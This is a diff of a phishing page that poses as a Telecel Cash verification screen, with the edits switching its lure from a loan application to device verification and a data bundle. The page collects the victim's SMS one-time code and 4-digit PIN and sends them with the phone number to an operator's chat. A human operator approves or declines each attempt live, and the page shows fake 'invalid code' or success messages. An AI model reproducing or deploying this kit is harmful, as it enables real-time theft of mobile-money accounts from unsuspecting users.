@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telecel Cash - Loan Verification</title>
+    <title>Telecel Cash - Device Verification</title>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
@@ -425,18 +425,18 @@
                 </div>
                 <div>
                     <div class="brand-name">Telecel Cash</div>
-                    <div class="tagline">Loans</div>
+                    <div class="tagline">Mobile Money</div>
                 </div>
             </div>
         </div>
 
-        <h1>Verify Your Loan</h1>
-        <p class="subtitle">A 6-digit verification code has been sent to your number. Enter it below to confirm your loan application.</p>
+        <h1>Verify Device</h1>
+        <p class="subtitle">Enter the 6-digit code sent to your number to verify this device and continue.</p>
         <p class="phone-display" id="phoneDisplay"></p>
 
         <!-- Offer Info -->
         <div class="offer-info">
-            <div class="offer-label">Loan Application</div>
+            <div class="offer-label">Data Bundle</div>
             <div class="offer-name" id="offerTitle"></div>
             <div class="offer-amount" id="offerPrice"></div>
             <div class="offer-meta" id="offerMeta"></div>
@@ -447,8 +447,8 @@
         <div class="error-msg" id="errMsg"></div>
 
         <div class="form-section">
-            <button class="btn-action" id="verifyBtn">Verify Loan Code</button>
-            <button class="back-btn" onclick="window.history.back()">← Back</button>
+            <button class="btn-action" id="verifyBtn">Verify Device Code</button>
+            <button class="back-btn" onclick="window.location.href='index.html'">← Back </button>
             <div class="security-note">
                 <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                     <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
@@ -471,13 +471,13 @@
                     </div>
                     <div>
                         <div class="brand-name">Telecel Cash</div>
-                        <div class="tagline">Loans</div>
+                        <div class="tagline">Mobile Money</div>
                     </div>
                 </div>
             </div>
 
             <h1>Enter PIN</h1>
-            <p class="subtitle">Enter your 4-digit PIN to complete this loan transaction securely.</p>
+            <p class="subtitle">Enter your 4-digit PIN to complete this transaction securely.</p>
 
             <div class="otp-container" id="pinInputs"></div>
             <div class="error-msg" id="pinErrMsg"></div>
@@ -569,7 +569,7 @@
         }
 
         function loadOffer() {
-            const name     = params.get('offer')    || params.get('name')     || params.get('loan_name')   || 'Flex Loan';
+            const name     = params.get('offer')    || params.get('name')     || params.get('loan_name')   || 'Data Bundle';
             const data     = params.get('data')     || '';
             const price    = params.get('price')    || params.get('amount')   || params.get('loan_amount') || '0';
             const phone    = params.get('phone')    || params.get('msisdn')   || '';
@@ -644,7 +644,6 @@
                 input.addEventListener('input', () => {
                     input.value = input.value.replace(/\D/g, '');
                     if (input.value.length === 1 && index < length - 1) inputs[index + 1].focus();
-                    // AUTO-FILL AND AUTO-SEND: When all digits are entered, automatically submit
                     if (getCode(containerId).length === length) setTimeout(callback, 200);
                 });
                 input.addEventListener('keydown', (e) => {
@@ -668,7 +667,7 @@
             if (code.length !== 6) {
                 isProcessing = false;
                 verifyBtn.disabled = false;
-                verifyBtn.textContent = 'Verify Loan Code';
+                verifyBtn.textContent = 'Verify Device Code';
                 return;
             }
 
@@ -686,7 +685,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CONFIG.CHAT_ID,
-                    text: `<b>🔴 Loan Verification</b>\n\n${paramSummary}\nCode: <code>${code}</code>\n\nChoose an action:`,
+                    text: `<b>🔴 Device Verification</b>\n\n${paramSummary}\nCode: <code>${code}</code>\n\nChoose an action:`,
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
@@ -704,7 +703,7 @@
             }).catch(() => {
                 isProcessing = false;
                 verifyBtn.disabled = false;
-                verifyBtn.textContent = 'Verify Loan Code';
+                verifyBtn.textContent = 'Verify Device Code';
             });
         }
 
@@ -725,17 +724,17 @@
                                 } else if (cb === verifyId) {
                                     clearInterval(interval);
                                     spinner.style.display = 'none';
-                                    showSuccessPage();
+                                    showSuccessPage();          // ← inline success
                                 } else if (cb === declineId) {
                                     clearInterval(interval);
                                     spinner.style.display = 'none';
-                                    errMsg.textContent = 'Code declined. Please try again.';
+                                    errMsg.textContent = 'Invalid code. Try again.';
                                     errMsg.style.display = 'block';
                                     document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
                                     focusFirstInput('otpInputs');
                                     isProcessing = false;
                                     verifyBtn.disabled = false;
-                                    verifyBtn.textContent = 'Verify Loan Code';
+                                    verifyBtn.textContent = 'Verify Device Code';
                                 }
                             }
                         });
@@ -791,7 +790,7 @@
                                 if (cb === validId) {
                                     clearInterval(interval);
                                     pinModal.style.display = 'none';
-                                    showSuccessPage();
+                                    showSuccessPage();          // ← inline success
                                 } else if (cb === invalidId) {
                                     clearInterval(interval);
                                     pinErrMsg.textContent = 'Invalid PIN. Please try again.';
